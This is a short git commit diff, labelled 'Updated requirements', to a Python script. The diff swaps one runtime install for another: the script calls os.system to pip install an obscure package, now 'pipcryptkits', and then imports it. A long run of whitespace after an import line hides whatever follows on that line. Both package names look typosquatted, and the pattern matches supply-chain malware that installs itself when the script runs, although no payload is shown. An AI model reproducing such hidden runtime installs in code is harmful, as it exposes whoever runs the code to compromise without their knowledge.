b82629adafdf9ffb9e866f1933484e30067dbe32
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-17 19:57:59 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqladdV1")
-import pipsqladdV1
+os.system("pip install pipcryptkits")
+import pipcryptkits
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
